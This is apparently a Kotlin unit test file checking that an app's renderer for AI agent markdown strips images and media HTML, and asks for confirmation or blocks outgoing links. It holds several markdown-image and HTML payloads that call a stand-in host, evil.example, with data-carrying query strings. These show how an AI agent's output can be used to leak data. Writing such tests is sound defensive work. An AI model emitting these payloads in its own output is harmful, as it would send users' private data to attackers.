package org.crux.ui.component.agent

import com.halilibo.richtext.markdown.node.AstHtmlBlock
import com.halilibo.richtext.markdown.node.AstHtmlInline
import com.halilibo.richtext.markdown.node.AstImage
import com.halilibo.richtext.markdown.node.AstNode
import com.halilibo.richtext.markdown.node.AstText
import org.crux.ui.route.DeeplinkRoute
import org.crux.ui.route.toUri
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Test

class AgentMarkdownSafetyTest {
    @Test
    fun imageBypassPayloadsNeverProduceImageNodes() {
        val payloads =
            listOf(
                // Shortcut reference with a definition line.
                "Answer\n\n![x]\n\n[x]: https://evil.example/p?d=3",
                // Full and collapsed references.
                "![x][ref] and ![ref][]\n\n[ref]: https://evil.example/p?d=4",
                // Nested and escaped brackets.
                "![a[b]](https://evil.example/p?d=2)",
                "![a\\]b](https://evil.example/p?d=5)",
                // Plain inline image, angle-bracket destination and title.
                "![alt](https://evil.example/p?d=1)",
                "![alt](<https://evil.example/p?d=6> \"t\")",
                // Image inside a link.
                "[![badge](https://evil.example/b.png)](https://example.com)",
                // Data URL.
                "![x](data:image/png;base64,AAAA)",
            )

        payloads.forEach { payload ->
            val nodes = parseAgentMarkdown(payload).allNodes()
            assertTrue(payload, nodes.none { it.type is AstImage })
            assertFalse(payload, nodes.renderedText().contains("evil.example/p"))
        }
    }

    @Test
    fun imageIsReplacedByItsAltText() {
        val text = parseAgentMarkdown("See ![a[b]](https://evil.example/p?d=2) here").allNodes().renderedText()

        assertTrue(text, text.contains("a[b]"))
        assertTrue(text, text.contains("See "))
        assertTrue(text, text.contains(" here"))
    }

    @Test
    fun htmlThatEmbedsMediaIsDropped() {
        val payloads =
            listOf(
                "Hi <img src=\"https://evil.example/p?d=1\"> there",
                "<picture><source srcset=\"https://evil.example/p\"></picture>\n",
                "<video poster=\"https://evil.example/p\"></video>\n",
                "<svg><image href=\"https://evil.example/p\"/></svg>\n",
                "<IMG SRC=https://evil.example/p>",
            )

        payloads.forEach { payload ->
            val nodes = parseAgentMarkdown(payload).allNodes()
            val htmlLiterals =
                nodes.mapNotNull { node ->
                    when (val type = node.type) {
                        is AstHtmlInline -> type.literal
                        is AstHtmlBlock -> type.literal
                        else -> null
                    }
                }
            assertTrue(payload, htmlLiterals.none { it.contains("evil.example", ignoreCase = true) })
            assertTrue(payload, htmlLiterals.none { it.contains("<img", ignoreCase = true) })
        }
    }

    @Test
    fun ordinaryMarkdownIsKept() {
        val text =
            parseAgentMarkdown("**Bold** and [a link](https://example.com)\n\n- item")
                .allNodes()
                .renderedText()

        assertTrue(text, text.contains("Bold"))
        assertTrue(text, text.contains("a link"))
        assertTrue(text, text.contains("item"))
    }

    @Test
    fun webAndOtherExternalLinksNeedConfirmation() {
        assertEquals(AgentLinkAction.Confirm, agentLinkAction("https://evil.example/c?d=private"))
        assertEquals(AgentLinkAction.Confirm, agentLinkAction("http://example.com"))
        assertEquals(AgentLinkAction.Confirm, agentLinkAction(" mailto:someone@example.com "))
    }

    @Test
    fun unsafeInAppLinksAreBlockedAndSafeOnesOpen() {
        assertEquals(
            AgentLinkAction.Block,
            agentLinkAction(DeeplinkRoute.OpenLinkDirectly("https://evil.example").toUri()),
        )
        assertEquals(AgentLinkAction.Block, agentLinkAction("flare-event://0a0b0c"))
        assertEquals(AgentLinkAction.Block, agentLinkAction(""))
        assertEquals(AgentLinkAction.Open, agentLinkAction(DeeplinkRoute.Login.toUri()))
    }

    private fun AstNode.allNodes(): List<AstNode> {
        val result = mutableListOf<AstNode>()
        fun visit(node: AstNode) {
            result += node
            var child = node.links.firstChild
            while (child != null) {
                visit(child)
                child = child.links.next
            }
        }
        visit(this)
        return result
    }

    private fun List<AstNode>.renderedText(): String = joinToString("") { (it.type as? AstText)?.literal.orEmpty() }
}
